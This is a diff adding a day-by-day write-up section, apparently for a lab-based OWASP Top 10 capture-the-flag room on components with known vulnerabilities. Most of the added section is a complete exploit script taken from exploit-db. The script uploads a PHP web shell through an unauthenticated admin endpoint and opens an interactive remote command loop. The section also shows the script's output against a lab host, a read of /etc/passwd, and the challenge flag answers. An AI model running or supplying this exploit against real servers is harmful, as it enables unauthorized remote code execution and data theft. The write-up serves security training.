@@ -290,6 +290,80 @@ After run `rce.py` file I've got shell then look for flag.txt in `/home/cmnatic/
 
 Flag: `4a69a7ff9fd68`
 
+## Day 8 - Components With Known Vulnerabilities
+
+Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well-documented vulnerability.
+
+For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution \(RCE\) exploit, and even better you can find an exploit already made on exploit-db.
+
+As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.
+
+Hence, why OWASP has rated this a 3 \(meaning high\) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.
+
+Based on that, in this case we can found an exploit in [exploit-db](https://www.exploit-db.com/) and try to attack the target to get the shell
+
+_**\#1 How many characters are in /etc/passwd \(use wc -c /etc/passwd to get the answer\)**_
+
+Following the guide, I've found a exploit in  [exploit-db](https://www.exploit-db.com/exploits/47887) by searching "Unauthenticated Remote Code Execution" . Then I've got this code then save it as rce.py and run it.
+
+```text
+import argparse
+import random
+import requests
+import string
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument('url', action='store', help='The URL of the target.')
+args = parser.parse_args()
+
+url = args.url.rstrip('/')
+random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
+
+payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'
+
+file = {'image': (random_file + '.php', payload, 'text/php')}
+print('> Attempting to upload PHP web shell...')
+r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
+print('> Verifying shell upload...')
+r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
+
+if random_file in r.text:
+    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
+    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
+    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
+    if launch_shell.lower() == 'y':
+        while True:
+            cmd = str(input('RCE $ '))
+            if cmd == 'exit':
+                sys.exit(0)
+            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
+            print(r.text)
+else:
+    if r.status_code == 200:
+        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
+    else:
+        print('> Web shell failed to upload! The web server may not have write permissions.')
+```
+
+```text
+root@kali:~! python rce.py [url]  // url means url of your target
+```
+
+Finally, I've got the shell. I've used `wc /etc/password` to counts the number of characters, words and lines. The example here is trying to see how many entries in `/etc/passwd`
+
+```text
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.90.249/bootstrap/img/TVgBS1aAhU.php
+> Example command usage: http://10.10.90.249/bootstrap/img/TVgBS1aAhU.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ wc /etc/passwd
+  31   40 1611 /etc/passwd
+```
+
+Flag: `1611`
+
 
 
 
